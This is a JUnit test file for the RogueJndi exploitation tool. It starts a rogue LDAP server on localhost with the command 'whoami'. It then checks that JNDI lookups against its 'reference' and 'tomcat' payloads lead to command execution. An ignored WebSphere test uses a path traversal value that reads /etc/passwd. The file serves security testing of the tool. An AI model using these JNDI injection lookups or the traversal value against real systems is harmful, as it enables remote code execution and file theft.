import artsploit.Config;
import artsploit.RogueJndi;
import org.junit.BeforeClass;
import org.junit.Ignore;
import org.junit.Test;

import javax.naming.InitialContext;

/**
 * Main testing class
 * @author artsploit
 */
public class RogueJndiTest {

    @BeforeClass
    public static void setup() throws Exception {
        //modify testing ldap and http ports to not interfere with the non-testing one
        Config.hostname = "127.0.0.1";
        Config.ldapPort = 1390;
        Config.httpPort = 8001;
        Config.command = "whoami";
        RogueJndi.main(new String[0]);
    }

    @Test
    public void reference() throws Exception {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        testLookup("ldap://" + Config.hostname + ":" + Config.ldapPort + "/o=reference");
    }

    @Test
    public void tomcat() throws Exception {
        testLookup("ldap://" + Config.hostname + ":" + Config.ldapPort + "/o=tomcat");
    }

    @Ignore
    @Test
    public void websphere1() throws Exception {
        testLookup("ldap://" + Config.hostname + ":" + Config.ldapPort + "/o=was2,file=../../../etc/passwd");
    }

    private void testLookup(String name) throws Exception {
        TestingSecurityManager sm = new TestingSecurityManager();
        try {
            System.setSecurityManager(sm);
            new InitialContext().lookup(name);
        } catch (Exception e) {
            e.printStackTrace();
        }

        System.setSecurityManager(null);
        sm.assertExec();
    }
}
